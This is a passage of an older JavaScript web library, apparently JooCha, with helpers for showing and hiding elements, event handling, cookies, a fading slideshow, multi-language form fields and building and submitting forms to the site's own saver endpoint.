  {
    try{if(pob.style.display=='none')return false;
    }catch(e){}
    pob=pob.offsetParent;
    tcnt--;
    if(tcnt<=0)break;
  }
return true;
}
//---------------------------------------------------
function isObjectShown(obj,tcnt)
{
if(document.getElementById(obj))obj=document.getElementById(obj);
  if(!tcnt)tcnt=3;
  var pob=obj;
  while(pob)
  {
    try{if(pob.style.display=='none'){return false;}
    }catch(e){}
    try{if(pob.style.visibility=='hidden'){return false;}
    }catch(e){}

    pob=pob.offsetParent;
    tcnt--;
    if(tcnt<=0)break;
  }
return true;
}

//---------------------------------------------------
function RemoveObjectEx(obj,par2)
{
	if(!obj)return false;
	
     var par=obj.parentNode;
     if(par)
     {
          par.removeChild(obj);
          return true;
     }
	 if(par2)
	 {
        par2.removeChild(obj);
        return true;
	 }
return false;
}
//---------------------------------------------------
function HideObjectEx(obj)
{
if(document.getElementById(obj))obj=document.getElementById(obj);
    try{obj.style.display='none';
    }catch(e){}
    try{obj.style.visibility='hidden';
    }catch(e){}

}
//---------------------------------------------------
function ShowObjectEx(obj)
{
if(document.getElementById(obj))obj=document.getElementById(obj);
    try{obj.style.display='';
    }catch(e){}
    try{obj.style.visibility='visible';
    }catch(e){}

}
//---------------------------------------------------
function InvertShowObject(obj,nnn)
{
if(!nnn)nnn=3;
if(document.getElementById(obj))obj=document.getElementById(obj);
   if(isObjectShown(obj,nnn))
       HideObjectEx(obj);
   else 
      ShowObjectEx(obj);
}
//-------------------
var GlobalEventList={};
var GlobalEventCounter=0;
function AddEventOnObject(obj,onevv,fnc,uniqalControl)//function(event){return EP_onkeydown(event,nid)}
{
 if(!uniqalControl)uniqalControl=false;
 var oo;
 if(typeof obj !== "object")
 {
	try{
	oo=document.getElementById(obj);
	}catch(e){console.log("AddEventOnObject: "+e);}
 }
 if(!oo)oo=obj;
 obj=oo;
 
 GlobalEventCounter++;
 if(!obj.id)obj.id="ForEvent"+GlobalEventCounter;
 if(!(obj.id in GlobalEventList))GlobalEventList[obj.id]={};
 
 if(uniqalControl){
    if(GlobalEventList[obj.id][onevv] && GlobalEventList[obj.id][onevv]!=undefined){
		RemoveEventOnObject(obj,onevv,GlobalEventList[obj.id][onevv]["function"]);
	}
 }
 GlobalEventList[obj.id][onevv]={"object":obj,"position":GlobalEventCounter,"event":onevv,"function":fnc};
 
try{
  if(oo.addEventListener)
      oo.addEventListener(onevv,fnc,false);
  else
      oo.attachEvent('on'+onevv,fnc);
  }catch(e)
  {
	console.log("AddEventOnObject: "+e);
	{
		switch(onevv)
		{
			case "load":oo.onload=fnc;
			break;
			default:		
				console.log("This event "+onevv+" does not work");
		}
	}
  }
return obj.id;
}
//-------------------
function RemoveEventOnObject(obj,onevv,fnc)//function(event){return EP_onkeydown(event,nid)}
{
 var oo;
 try{
 oo=document.getElementById(obj); 
 }catch(e){}
 if(!oo)oo=obj;
obj=oo;

 if(!fnc){
	if(GlobalEventList[obj.id][onevv] && GlobalEventList[obj.id][onevv]!=undefined)
		RemoveEventOnObject(obj,onevv,GlobalEventList[obj.id][onevv]["function"]);
 }
 else 
 
try{
  if(oo.removeEventListener){
      oo.removeEventListener(onevv,fnc,false);
	  }
  else {
      oo.detachEvent('on'+onevv,fnc);
	 }
  }catch(e)
  {
     oo.detachEvent('on'+onevv,fnc);
  }

}

//-------------------
function AddEventByString(obj,onevv,fncParam)//function(event){return EP_onkeydown(event,nid)}
{
   return AddEventOnObject(obj,onevv,function(e){var event=e || window.event;var target=(event.target != null ? event.target : event.srcElement); eval(fncParam);});
}
//---------------------------------------------------
function GetObjectEventList(el){
	var vid=(((typeof el)=="object") && el.id?el.id:el);
	if(vid in GlobalEventList)return GlobalEventList[vid];
return [];	
}
//---------------------------------------------------
function CheckObjectEvent(el,ev){
	var pointer=GetObjectEventList(el);
	if(pointer.length<=0)return false;
	
	if(ev in pointer){
		return pointer[ev];
	}
	return false;
}
//---------------------------------------------------
var classEvent={
  add:function(obj,etype,fp,cap)
  {
       cap=cap||false;
       if(obj.addEventListener)obj.addEventListener(etype,fp,cap);
       else 
       if(obj.attachEvent)obj.attachEvent("on"+etype,fp);
  },
  remove:function(obj,etype,fp,cap)
   {
        cap=cap||false;
       if(obj.removeEventListener)obj.removeEventListener(etype,fp,cap);
       else
       if(obj.detachEvent)obj.detachEvent("on"+etype,fp);
  }
};
//---------------------------------------------------
function InitUnselectable(obj)
{
var oo=document.getElementById(obj); 
   AddEventOnObject(obj,'selectstart','return false;');
if(oo.MozUserSelect)  oo.MozUserSelect='none';
if(oo.webkitUserSelect)  oo.webkitUserSelect='none';
if(oo.oUserSelect)  oo.oUserSelect='none';
if(oo.UserSelect)  oo.UserSelect='none';
if(oo.khtmlUserSelect)  oo.khtmlUserSelect='none';

   
}

//---------------------------------------------------
function GetObjectMethods(obj)
{
  var methods = [];
  for (var m in obj) 
  {
    if (typeof obj[m] == "function") 
	{
        methods.push(m);
    }
  }
return methods;//.join(","));
}
//---------------------------------------------------
function scriptRunAfterInnerHTML(body_el, tag) {
    // Finds and executes scripts in a newly added element's body.
    // Needed since innerHTML does not run scripts.
    //
    // Argument body_el is an element in the dom.

    function nodeName(elem, name) {
        return elem.nodeName && elem.nodeName.toUpperCase() ===
              name.toUpperCase();
    };

    function evalScript(elem, id, callback) {
        var data = (elem.text || elem.textContent || elem.innerHTML || "" ),
            head = document.getElementsByTagName("head")[0] ||
                      document.documentElement;

        var script = document.createElement("script");
        script.type = "text/javascript";
        if (id != '') {
            script.setAttribute('id', id);
        }

        if (elem.src != '') {
            script.src = elem.src;
            head.appendChild(script);
            // Then bind the event to the callback function.
            // There are several events for cross browser compatibility.
            script.onreadystatechange = callback;
            script.onload = callback;
        } else {
            try {
                // doesn't work on ie...
                script.appendChild(document.createTextNode(data));      
            } catch(e) {
                // IE has funky script nodes
                script.text = data;
            }
            head.appendChild(script);
            callback();
        }
    };

    function walk_children(node) {
        var scripts = [],
          script,
          children_nodes = node.childNodes,
          child,
          i;

        if (children_nodes === undefined) return;

        for (i = 0; i<children_nodes.length; i++) {
            child = children_nodes[i];
            if (nodeName(child, "script" ) &&
                (!child.type || child.type.toLowerCase() === "text/javascript")) {
                scripts.push(child);
            } else {
                var new_scripts = walk_children(child);
                for(j=0; j<new_scripts.length; j++) {
                    scripts.push(new_scripts[j]);
                }
            }
        }

        return scripts;
    }

    var i = 0;
    function execute_script(i) {
		if(i==0 && scripts.length<1)return '';
		if(!scripts || !scripts[i] || scripts[i]===undefined)return '';
	
        script = scripts[i];
        if (script.parentNode) {script.parentNode.removeChild(script);}
        evalScript(scripts[i], tag+"_"+i, function() {
            if (i < scripts.length-1) {
                execute_script(++i);
            }                
        });
    }

    // main section of function
    if (tag === undefined) tag = 'scriptRunAfterInnerHTML_tmp';

    var scripts = walk_children(body_el);

    execute_script(i);
}
//===============================
//========= Cookie ==============
//===============================
function setCookie(cname, cvalue, exdays) {
    var d = new Date();
    d.setTime(d.getTime() + (exdays*24*60*60*1000));
    var expires = "expires="+d.toUTCString();
    document.cookie = cname + "=" + cvalue + "; " + expires;
}

function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for(var i = 0; i < ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0) == ' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}

function checkCookie() {
    var user = getCookie("username");
    if (user != "") {
        alert("Welcome again " + user);
    } else {
        user = prompt("Please enter your name:", "");
        if (user != "" && user != null) {
            setCookie("username", user, 365);
        }
    }
}

////-----Close Browser Tabs Add Events ---------------
function xchgCloseEvent(els){
	for(i=0;i<els.length;i++)if(els[i].type!="hidden" && els[i].style.display!="none"){
    AddEventOnObject(els[i],"change",function(ev){
			window.onbeforeunload = function(event) {
				event = event || window.event;
				var confirmClose = "Are you sure?";
				// For IE and Firefox prior to version 4
				if (event) {
					event.returnValue = confirmClose;
				}
				// For Safari
				return confirmClose;
			}
		});
		};//for
}

/*
Sample:
xchgCloseEvent(document.getElementsByTagName("input"));
*/
function winOpen(mthd, url, data, target) {
  var form = document.createElement("form");
  form.action = url;
  form.method = mthd;
  form.target = target || "_self";
  if (data) {
    for (var key in data) {
      var input = document.createElement("textarea");
      input.name = key;
	  input.setAttribute("data-typeof",typeof data[key]);
      input.value = (typeof data[key] === "object" ? JSON.stringify(data[key]) : data[key]);
      form.appendChild(input);
    }
  }
  var ua=URLToArray(url);
  if(ua){
	for (var key in ua)
	if(typeof ua[key] !== "function"){
      var input = document.createElement("input");
	  input.type = "text";
      input.name = key;
	  input.setAttribute("data-typeof",typeof ua[key]);
      input.value = (typeof ua[key] === "object" ? JSON.stringify(ua[key]) : ua[key]);
      form.appendChild(input);
	}
  }
  form.style.display = 'none';
  document.body.appendChild(form);
  form.submit();
};

//--------------------------------------------------------
 var waitUntilLoad = function (fn, obj, interval) {
    interval = interval || 100;

    var shell = function () {
            var timer = setInterval(
                function () {
                    var check;

                    try { check = (obj.innerHTML!==''); } catch (e) { check = false; }

                    if (check) {
                        clearInterval(timer);
                        delete timer;
                        fn();
                    }
                },
                interval
            );
        };

    return shell;
};

/* jc_slideshow.js */

//---------------------------------------------------
var FadeBuffer={Opacity:new Array(),Obj:new Array(),Step:new Array(),Code:new Array()};
//---------------------------------------------------
function FadeGetFree(Obj)
{
var i=0;
for(;i<FadeBuffer.Obj.length;i++)
   if(FadeBuffer.Obj[i]==0)break;

   FadeBuffer.Obj[i]=Obj;
return i;
}
//---------------------------------------------------
function FadeInEx(oi)
{
  OF_Alpha(FadeBuffer.Obj[oi],FadeBuffer.Opacity[oi]);
  if((FadeBuffer.Opacity[oi]<=1.0)&&(FadeBuffer.Opacity[oi]>=0.0))
  {
     FadeBuffer.Opacity[oi]+=FadeBuffer.Step[oi];
     setTimeout("FadeInEx("+oi+")",50);
  }
  else
  {
     if(FadeBuffer.Code[oi])
     {
        var ccd=FadeBuffer.Code[oi].replace('this',"FadeBuffer.Obj["+oi+"]");
        eval(ccd);
     }

     FadeBuffer.Obj[oi]=0;
  } 
}
//---------------------------------------------------
function FadeOut(oDiv,Stp,Cd)
{
if(!Stp)Stp=0.25;
if(!Cd)Cd='';
var pos=FadeGetFree(oDiv);
FadeBuffer.Opacity[pos]=1.0;
FadeBuffer.Step[pos]=-Stp;
FadeBuffer.Code[pos]=Cd;
FadeInEx(pos);

}
//---------------------------------------------------
function FadeIn(oDiv,Stp,Cd)
{
if(!Stp)Stp=0.25;
if(!Cd)Cd='';
var pos=FadeGetFree(oDiv);
FadeBuffer.Opacity[pos]=0.0;
FadeBuffer.Step[pos]=Stp;
FadeBuffer.Code[pos]=Cd;
FadeInEx(pos);
}
//---------------------------------------------------
function SlideShowPlay(nm,tagnm)
{
if(!tagnm)tagnm="LI";
var obj=document.getElementById(nm);

if(obj){
  var ssli=obj.getElementsByTagName(tagnm);

  var i=0;
  for(;i<ssli.length;i++)
     if(ssli[i].style.visibility=='visible')break;
     if(i>=ssli.length)i=0;

  var ssss=ssli[i];
  ssss.style.visibility='visible';
  i++;if(i>=ssli.length)i=0;
  ssli[i].style.visibility='visible';

  OF_Alpha(ssli[i],0);
  FadeIn(ssss,0.1,"this.style.visibility='hidden';");

  }
}
//---------------------------------------------------
function SlideShowInit(nm,tagnm)
{
if(!tagnm)tagnm="LI";
var obj=document.getElementById(nm);

if(obj){
  var ssli=obj.getElementsByTagName(tagnm);

  var i=0;
  for(;i<ssli.length;i++)
  {
    ssli[i].style.zIndex=50+ssli.length-i;
    ssli[i].style.visibility='hidden';
  }
    ssli[0].style.visibility='visible';


  }
}
//---------------------------------------------------
function SlideShowInit2(nm,tagnm)
{
if(!tagnm)tagnm="LI";
var obj=document.getElementById(nm);

if(obj){
  var ssli=obj.getElementsByTagName(tagnm);

  var i=0;
  for(;i<ssli.length;i++)
  {
    var ulo=ssli[i].getElementsByTagName("UL");
	if(ulo.length>0)
	{
	    ulo=ulo[0];
		var imefs=ulo.getElementsByTagName("IMG");
		if(imefs)
		{
	
	        if(i+1<ssli.length)
			{
				for(var j=0;j<imefs.length;j++)
				{
					var local=imefs[j];
					var delstt=imefs[j].getAttribute('jc_delstyle');
	
					var icode="{";
					if(imefs[j].id)icode+=" local=document.getElementById('"+imefs[j].id+"');";
					if(delstt)icode+="{"+delstt+"};";
					icode+="}";
					if(icode)eval(icode);
				}
			}
			else
			{
				//for(var j=0;j<imefs.length;j++)
				{
					//imefs[j].style.zIndex=50+i;
					//imefs[j].style.visibility='visible';
				}
			
			}
		}
		
	}
	//else
	{
	    if(i+1<ssli.length)
		{
			ssli[i].style.zIndex=50+i;	
			ssli[i].style.visibility='hidden';
		}
		else
		{
			ssli[i].style.zIndex=49;	
			ssli[i].style.visibility='visible';
		}
	
	}
  }



  }
}
//---------------------------------------------------
function SlideShowPlay2(nm,tagnm,addstl,delay)
{
if(!tagnm)tagnm="LI";
if(!delay)delay=50;
var obj=document.getElementById(nm);

if(obj){
  var ssli=obj.getElementsByTagName(tagnm);
  if(ssli.length==0)return 0;

  var i=0;
  for(;i<ssli.length;i++)
     if(ssli[i].style.visibility=='hidden')break;
     if(i>=ssli.length){i=0;SlideShowInit2(nm,tagnm);}

	 ssli[i].style.visibility='visible';
	 
	 
    var ulo=ssli[i].getElementsByTagName("UL");
	if(ulo.length>0)
	{
	    ulo=ulo[0];
		var imefs=ulo.getElementsByTagName("IMG");
		if(imefs)
		{
	        for(var j=0;j<imefs.length;j++)
			{
			  var local=imefs[j];
			  var adstt=imefs[j].getAttribute('jc_addstyle');

			  var icode="{";
			  if(imefs[j].id)icode+=" local=document.getElementById('"+imefs[j].id+"');";
			  if(adstt)icode+="{"+adstt+"};";
			  if(addstl)icode+="{"+addstl+"};";
			  icode+="}";
			  
			  setTimeout("eval(\""+icode+"\");",j*delay);
			  //if(icode)eval(icode);
			}

		}
		
	}
	//else
	{
			 // var local=ssli[i];
			 // var adstt=ssli[i].getAttribute('jc_addstyle');
			  //if(adstt)eval(adstt);
			  //if(addstl)eval(addstl);
			  
	}

  }
}

//---------------------------------------------------

/* jc_multilang.js */

/*
*
* JooCha Engine - Web Library 2017
* Version 1.0, multilang chooser work for formtable.php library
*
*/

function inlineInitMultiLangChooser(){
	var els=document.getElementsByClassName("selmu");
	for(var i=0;i<els.length;i++){
		AddEventOnObject(els[i],"change",function(){
			var o=this;
			var cls=o.getAttribute("data-class");
			var tp=o.getAttribute("data-type");
			if(!tp)tp=o.tagName;
			var sfx=o.getAttribute("data-suffix");
			
			if(["select","textarea","i_","i2_","x_"].indexOf(tp)==-1){
				var vl=o.value;
				var chlds=document.getElementsByClassName(cls+"_class");
				for(var t=0;t<chlds.length;t++){
					if(vl==chlds[t].name){
						chlds[t].setAttribute("type",tp);
						chlds[t].style.display="inline-block";
					}
					else{
						chlds[t].setAttribute("type","hidden");
						chlds[t].style.display="none";
					}
				}
			}else
			if(["select","textarea"].indexOf(tp)>=0){
				var vl=o.value;
				var chlds=document.getElementsByClassName(cls+"_class");
				for(var t=0;t<chlds.length;t++){
					if(vl==chlds[t].name)
					chlds[t].style.display="inline-block";
					else
					chlds[t].style.display="none";
				}
			}else
			if(["i_","i2_","x_"].indexOf(tp)>=0){
				var vl=o.value;
				var chlds=document.getElementsByClassName(cls+sfx);
				for(var t=0;t<chlds.length;t++){
					if(vl==chlds[t].getAttribute("data-lang"))
					chlds[t].style.display="inline-block";
					else
					chlds[t].style.display="none";
				}
			}

		});
	}
}	

function afterLoadInitMultiLangChooser(){
	var els=document.getElementsByClassName("selmu");
	for(var i=0;i<els.length;i++){
			var o=els[i];
			var cls=o.getAttribute("data-class");
			var tp=o.getAttribute("data-type");
			if(!tp)tp=o.tagName;
			var sfx=o.getAttribute("data-suffix");
			var chlds;
			if(["i_","i2_","x_"].indexOf(tp)>=0)
				chlds=document.getElementsByClassName(cls+sfx);
			else
				chlds=document.getElementsByClassName(cls+"_class");
			
			chlds[0].setAttribute("type",tp);
			chlds[0].style.display="inline-block";
			for(var t=1;t<chlds.length;t++){
				chlds[t].setAttribute("type","hidden");
				chlds[t].style.display="none";
			}
	}
}
	
/*initializacia*/	
AddEventOnObject(window,"load",afterLoadInitMultiLangChooser);


/* jc_form.js */

/**
 * js_form - JavaScript JooCha Library
 *
 * JS library for formtable PHP class
 *
 * @link    http://joocha.com
 * @license For open source use: GPLv3
 *          For commercial use: Commercial License
 * @author  John Chavchanidze
 * @version 1.0.1
 *
 * See usage examples at http://joocha.com/examples
 */
function pEvent(e)
{
	var evn=0;
	try{var evn=event || window.event || e;}catch(e){evn=0;};
return evn;
}

//--------------------------------------------------
var GlobalButtonID=0,ButtonFunctionArray=new Array(),LastButtonName;
//--------------------------------------------------
function getbuttonmax(id,nm,attr,cls,attrtab,icon,submit_event)
{
if(!attrtab)attrtab=" width='124px' ";
var bid=GlobalButtonID++;
LastButtonName="buttonid_"+bid;
if(id)LastButtonName=id;
var idstring=" id='"+LastButtonName+"' ";
var fn="href=";

ButtonFunctionArray[LastButtonName]=submit_event;
	 
     var tp=2;
	 var la=attr; 
     if(la[0]=='?')tp=3;
     if(la.substr(0,fn.length).toLowerCase()==fn)tp=1;
     else
     {
         fn="ins_onclick=";
         if(la.substr(0,fn.length).toLowerCase()==fn)
         {
             tp=5;
             attr=la.substr(fn.length).toLowerCase();
         }
     }
     var html="";

  if(attrtab=='~')attrtab=" width='124px' ";
  var ahref="";
  if(tp==3)ahref="<a  "+idstring+" href='"+attr+"'  onclick=\"window.open(this.href,'_top');\" class='but_"+cls+"'>";
else
  if(tp==1)ahref="<a "+idstring+"  "+attr+"  onclick='return 0;' class='but_"+cls+"'>";
else
  if(tp==5)ahref="<a  "+idstring+" class='but_"+cls+"'  onclick=\""+attr+";FormButtonToSubmit(event,this);return 0;\" >";
else
  if(la.length>8)  ahref="<a  "+idstring+" class='but_"+cls+"'FormButtonToSubmit  "+attr+" >";
else
   ahref="<a  "+idstring+" class='but_"+cls+"'  onclick=\"(event,this);return 0;\" >";

  html+=ahref+"<table "+attrtab+" border=0 cellpadding=0 cellspacing=0 ><tr><td class='"+cls+"l'>&nbsp;</td>";

  if(icon)html+="<td class='"+cls+"i_"+icon+"' >&nbsp;</td>";
  if(nm) html+="<td class='"+cls+"' >"+nm+"</td>";
  html+="<td class='"+cls+"r'>&nbsp;</td></tr></table></a>";

return html;
}

//---------------------------------------------------
function setbuttonasdefault(butid)
{
   return "AddEventOnObject(GetParentByTag(document.getElementById('"+butid+"'),'form') ,'submit',"+ButtonFunctionArray[butid]+");";
}

function setlastbuttonasdefault()
{
   return setbuttonasdefault(LastButtonName);
}


function getbuttonex(nm,attr,cls,attrtab,icon,submit_event)
{
    return getbuttonmax('',nm,attr,cls,attrtab,icon,submit_event);
}


function getbutton(nm,attr,attrtab,icon,submit_event)
{
  return getbuttonex(nm,attr,'bt',attrtab,icon,submit_event);
}

function getbuttonsubmit(nm,attr,attrtab,icon,submit_event)
{
  return getbuttonex(nm,attr,'bt2',attrtab,icon,submit_event);
}

//---------------------------------------------------
function JC_CheckAll(objPar,chk)
{
var Childs=objPar.getElementsByTagName('input');
if(!Childs)Childs=objPar.all;

if(Childs)
{
   for(var i = 0; i <Childs.length; i++)
   if(Childs[i].tagName)
   {
      if((Childs[i].tagName.toLowerCase()=='input')&&(Childs[i].getAttribute('type').toLowerCase()=='checkbox')||
        (Childs[i].tagName.toLowerCase()=='checkbox'))
        {
                  Childs[i].checked=chk;
        }
   }
}

}
//--------------------------------------------------
function JC_CheckAllByName(objnm,chk)
{
var v=document.getElementById(objnm);
JC_CheckAll(v,chk);
if(v.checked)v.value="on";
else v.value="off";
}
//--------------------------------------------------
function GetParentByTag(obj,tg)
{
var ret=0;
tg=tg.toLowerCase();

while(obj)
{
  if(obj.parentNode)
  {
    if(obj.parentNode.tagName)
    if(obj.parentNode.tagName.toLowerCase()==tg)
     {
        ret=obj.parentNode;break;
     }

     obj=obj.parentNode;
   }else break;
}
return ret;
}

//--------------------------------------------------
function RowSelectClass(obj,cls)
{
    var r=GetParentByTag(obj,'tr');
    if(r)
    if(obj.checked){
      addClass(r,cls);
    }
    else {
		delClass(r,cls);
    }

}
//--------------------------------------------------
function RowSelectAccount(obj,namespace,account)
{
	if(!namespace)namespace="gc";
	if(obj.form && window[namespace+"_LParamObject"]){
		window[namespace+"_LParamObject"]["account"]=account;
		try{
		obj.form.elements.namedItem(namespace+"_lparam").value=JSON.stringify(window[namespace+"_LParamObject"]);
		}catch(e){console.log("Error form namedItem on tag "+obj.tagName+": "+e);}
	}
}
//--------------------------------------------------
function THF_MoveAttributes(objdest,existsobj)
{
var Childs=objdest.getElementsByTagName('input');
if(!Childs)Childs=objdest.all;

var ChildsEx=existsobj.getElementsByTagName('input');
if(!ChildsEx)ChildsEx=existsobj.all;

if(Childs)
{
   for(var i = 0; i <Childs.length; i++)
   if(Childs[i].tagName)
   {
      if((Childs[i].tagName.toLowerCase()=='input')&&(Childs[i].getAttribute('type').toLowerCase()=='checkbox')||
        (Childs[i].tagName.toLowerCase()=='checkbox'))
        {
                  Childs[i].checked=ChildsEx[i].checked;
        }
      if((Childs[i].tagName.toLowerCase()=='input')&&(Childs[i].getAttribute('type').toLowerCase()!='hidden')&&
        (Childs[i].tagName.toLowerCase()!='hidden'))
        {
                   Childs[i].value=ChildsEx[i].value;
        }
   }
}
}
//--------------------------------------------------
function THF_MoveAttributesByName(destnm,exnm)
{
THF_MoveAttributes(document.getElementById(destnm),document.getElementById(exnm));
}
//--------------------------------------------------
function THF_SetDefault(objPar,vl)
{
var Childs=objPar.getElementsByTagName('input');
if(!Childs)Childs=objPar.all;

if(Childs)
{
   for(var i = 0; i <Childs.length; i++)
   if(Childs[i].tagName)
   {
      if((Childs[i].tagName.toLowerCase()=='input')&&(Childs[i].getAttribute('type').toLowerCase()=='checkbox')||
        (Childs[i].tagName.toLowerCase()=='checkbox'))
        if(Childs[i].value==vl)
        {
                  Childs[i].checked=true;
        }
   }
}

}
//--------------------------------------------------
function THF_SetDefaultByName(objnm,vl)
{
THF_SetDefault(document.getElementById(objnm),vl);
}

//--------------------------------------------------
function SetFormMethod(formname,mth)
{
    var obj=document.getElementById(formname);
    if(obj)
    {
          obj.method=mth;
    }
return obj;
}
//-------------------------------------
function SetFormElementValue(formname,elname,val)
{
    var els=0;
    var obj=document.getElementById(formname);
    if(obj)
    {
        els=obj.elements;
        if(val!='~')els[elname].value=val;
    }
return els;
}
//----------------------------------------------------
function CreatePostLink(ev,formname,submit_disable)
{
    var postform="";
    var obj=document.getElementById(formname);
    if(!obj)obj=formname;
	
    if(!ev)ev=window.event;
    if(obj)
    {
	
		var namespace=obj.getAttribute("data-namespace").value;
		if(!namespace)namespace="gc";	
		try{
		obj.elements.namedItem(namespace+"_lparam").value=JSON.stringify(window[namespace+"_LParamObject"]);
		}catch(e){console.log("Error form namedItem on tag "+obj.tagName+": "+e);}

        if(ev)ev.returnValue=false;
        if(ev)if(ev.shiftKey)obj.target='_blank';

        if(!submit_disable)
        {
			EditPanelSync();
   			try{
				GetFormSubmitButton(formname).click();
			}catch(e){
				obj.submit();
			}

        }
  }
return obj;
}
//--------------------------------------------------
function FormButtonToSubmit(ev,obj,submit_disable)//event,this
{
    if(!ev)ev=window.event;
    var r=GetParentByTag(obj,'form');
    return CreatePostLink(ev,r.name,submit_disable);
}
//--------------------------------------------------
function GetFormSubmitButton(formname){
	if((!formname) || (!document.getElementById(formname)))return "";
	var obj=document.getElementById(formname+"_submit");
	
	if(!obj){
		var els=document.getElementById(formname).getElementsByTagName("input");
		for(var i=0;i<els.length;i++){
			if(els[i].type.toLowerCase()=="submit")return els[i];
		}
		return "";
	}
	
	return obj;
}
//--------------------------------------------------
function CreatePostLink2(ev,formname,gcname,req,ord,rec,myid,frmnm,fnc,pgnum,htmlobjnm,htmlobjfield,submit_disable,srch,hoid)
{
    var postform="";
    var obj=document.getElementById(formname);
    if(!ev)ev=window.event;
	if(!hoid)hoid=0;

    if(obj)
    {
        var els=obj.elements;
		
		var namespace=obj.getAttribute("data-namespace").value;
		if(!namespace)namespace="gc";
		try{
		obj.elements.namedItem(namespace+"_lparam").value=JSON.stringify(window[namespace+"_LParamObject"]);
		}catch(e){console.log("Error form namedItem on tag "+obj.tagName+": "+e);}
		

        if(ev)ev.returnValue=false;
        if(ev)if(ev.shiftKey)obj.target='_blank';
        if(req!='~')els[gcname+"_req"].value=req;
        if(srch!='~')els[gcname+"_fsearch"].value=srch;
        if(frmnm!='~')els[gcname].value=frmnm;
        if(myid!='~')els[gcname+"uid"].value=myid;
		//if(myid!='~')els[gcname+"_uid"].value=myid;
        //if(myid!='~')els["id"].value=myid;
        //if(fnc!='~')els["fnc"].value=fnc;
		if(fnc!='~')els[gcname+"_fnc"].value=fnc;

        if(ord!='~')els[gcname+"_ord"].value=ord;
        if(rec!='~')els[gcname+"_recycle"].value=rec;
        if(pgnum!='~')els[gcname+"_pgnum"].value=pgnum;
        if(htmlobjnm!='~')els[gcname+"_hobj"].value=htmlobjnm;
        if(htmlobjfield!='~')els[gcname+"_hfield"].value=htmlobjfield;
        if(hoid!='~')els[gcname+"_hoid"].value=hoid;
		
        if(submit_disable=='')
        {
			EditPanelSync();
			try{
				GetFormSubmitButton(formname).click();
			}catch(e){
				obj.submit();
			}
            
        }
  }

}
//--------------------------------------------------
function serializeJCForm2(ev,formname,gcname,req,ord,rec,myid,frmnm,fnc,pgnum,htmlobjnm,htmlobjfield,submit_disable,srch,hoid)
{
    CreatePostLink2(ev,formname,gcname,req,ord,rec,myid,frmnm,fnc,pgnum,htmlobjnm,htmlobjfield,'yes',srch,hoid);
	EditPanelSync();
    return serialize(formname);
}
//--------------------------------------------------
var UnicMSG_CPL3;
function CreatePostLink3Event(data)
{
   //document.getElementById(UnicMSG_CPL3+'_msg').innerHTML=data.responseText;
   alert(data.responseText);
}
//--------------------------------------------------
function CreatePostLink3(ev,formname,gcname,req,ord,rec,myid,frmnm,fnc,pgnum,htmlobjnm,htmlobjfield,submit_disable,srch,hoid,procedure)
{
   var postParams=serializeJCForm2(ev,formname,gcname,req,ord,rec,myid,frmnm,fnc,pgnum,htmlobjnm,htmlobjfield,submit_disable,srch,hoid);
   //alert(document.getElementById(formname).action+"?"+location.search);
   //var act=document.getElementById(formname).action;
	var sr=new SendRecv();
	if(procedure)
		sr.PROCRESPONSE=procedure;
	else
		sr.PROCRESPONSE=CreatePostLink3Event;
	//alert(FullWebLink+"?phpParam=jc_formsaver.php&"+postParams);
	//UnicMSG_CPL3=MessageBox('Please wait...','Saving...','MB_OK');
	//alert(postParams.length+' '+postParams);
	sr.SendQuery("",FullWebLink+"?phpParam=jc_formsaver.php&"+SIDNAME+"="+SID,null,postParams);
}
//--------------------------------------------------
//--------------------------------------------------
var FormSaverLatestID=0;
//--------------------------------------------------
function EndFormSaving(){winclose(FormSaverLatestID);}
//--------------------------------------------------
function EndFormSending(){winclose(FormSaverLatestID);}
//--------------------------------------------------
function SaveFormDataEventProc(data)
{
   var msg=data.responseText;
   var n=msg.match(/(code\:[\s]+[\-0-9]*)/g);
   n=parseInt(str2Int(n[0]));
   if(!n)if(msg!='undefined')OpenWinHtml('',msg);
   //document.getElementById(UnicMSG_CPL3+'_msg').innerHTML=data.responseText;
   //OpenWinHtml('',data.responseText);
   winclose(FormSaverLatestID);
}
//--------------------------------------------------
function SaveFormData(formname,procedure,link)
{
   FormSaverLatestID=OpenWaitingEx();
   EditPanelSync();
   
   var obj=document.getElementById(formname);
	var namespace=obj.getAttribute("data-namespace").value;
	if(!namespace)namespace="gc";	
	try{
	obj.elements.namedItem(namespace+"_lparam").value=JSON.stringify(window[namespace+"_LParamObject"]);
	}catch(e){console.log("Error form namedItem on tag "+obj.tagName+": "+e);}
   
   var postParams=serialize(formname);
	var sr=new SendRecv();
	if(procedure)
		sr.PROCRESPONSE=procedure;
	else
		sr.PROCRESPONSE=SaveFormDataEventProc;
		
	//alert(FullWebLink+"?phpParam=jc_formsaver.php&"+postParams);
	//UnicMSG_CPL3=MessageBox('Please wait...','Saving...','MB_OK');
	//alert(postParams.length+' '+postParams);
	
	if(!link)link=FullWebLink+"?phpParam=jc_formsaver.php&"+SIDNAME+"="+SID;
	sr.SendQuery(formname+"InfoBox",link,null,postParams);

}
//--------------------------------------------------
function SendFormData(formname,procedure,link){SaveFormData(formname,procedure,link);};
//--------------------------------------------------
function AddFormTarget(formname,tar)
{
if(!tar)tar=formname+'_target';
var obj=document.getElementById(formname);
if(obj)
   if(document.getElementById(tar))
   {
       obj.target=tar;
   }else
   {
        var dv=document.createElement('iframe');
        dv.id=tar;
        dv.name=tar;
        dv.style.position='absolute';
        dv.style.top=0;
        dv.style.left=0;
        dv.style.width=0;
        dv.style.height=0;
        dv.style.zIndex=0;
        dv.style.overflow='hidden';
        dv.style.display='none';
        obj.appendChild(dv);
        obj.target=tar; 
   }
}
//--------------------------------------------------
function CreateGetLink2(ev,formname,gcname,req,ord,rec,myid,frmnm,fnc,pgnum,htmlobjnm,htmlobjfield,submit_disable,srch,hoid)
{
    var getform="";
    var obj=document.getElementById(formname);

    if(!ev)ev=window.event;
    if(obj)
    {
        var els=obj.elements;
		
	var namespace=obj.getAttribute("data-namespace").value;
	if(!namespace)namespace=gcname;
	try{
	obj.elements.namedItem(namespace+"_lparam").value=JSON.stringify(window[namespace+"_LParamObject"]);
	}catch(e){console.log("Error form namedItem on tag "+obj.tagName+": "+e);}
		

        if(ev)ev.returnValue=false;

        if(ev)if(ev.shiftKey)obj.target='_blank';
        if(req!='~')getform+=gcname+"_req="+req+"&";
        if(frmnm!='~')getform+=gcname+"="+frmnm+"&";
        if(srch!='~')getform+=gcname+"_fsearch="+srch+"&";
